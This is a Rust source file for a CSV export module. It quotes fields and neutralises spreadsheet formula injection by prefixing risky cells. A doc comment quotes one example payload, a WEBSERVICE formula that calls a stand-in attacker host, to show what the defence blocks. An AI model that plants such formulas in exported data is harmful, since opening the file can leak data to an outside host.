//! CSV export: formula neutralisation, field quoting, and file writing.

use saya_types::QueryResult;
use std::path::Path;

use super::shared::normalize_row;

fn cell_to_csv_string(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::Null => String::new(),
        serde_json::Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

/// Prefixes spreadsheet-formula-looking cells so opening the export in Excel
/// or LibreOffice cannot execute them (`=WEBSERVICE("http://attacker/")`).
/// Numeric values that merely start with `+`/`-` are left untouched.
pub(crate) fn neutralize_formula(field: &str) -> String {
    let trimmed = field.trim_start();
    let risky = match trimmed.chars().next() {
        Some('=') | Some('@') => true,
        Some('+') | Some('-') => trimmed[1..].trim().parse::<f64>().is_err(),
        _ => false,
    };
    if risky {
        format!("'{field}")
    } else {
        field.to_string()
    }
}

fn escape_csv_field(field: &str) -> String {
    if field.contains(',') || field.contains('"') || field.contains('\r') || field.contains('\n') {
        format!("\"{}\"", field.replace('"', "\"\""))
    } else {
        field.to_string()
    }
}

pub(super) fn export_csv(result: &QueryResult, path: &Path) -> Result<usize, String> {
    let col_count = result.columns.len();
    let header = result
        .columns
        .iter()
        .map(|c| escape_csv_field(&neutralize_formula(c)))
        .collect::<Vec<_>>()
        .join(",");
    let mut lines = vec![header];
    for row in &result.rows {
        let cells = normalize_row(row, col_count);
        let line = cells
            .iter()
            .map(|cell| escape_csv_field(&neutralize_formula(&cell_to_csv_string(cell))))
            .collect::<Vec<_>>()
            .join(",");
        lines.push(line);
    }
    let content = lines.join("\n") + "\n";
    std::fs::write(path, content).map_err(|e| format!("failed to write CSV file: {e}"))?;
    Ok(result.rows.len())
}
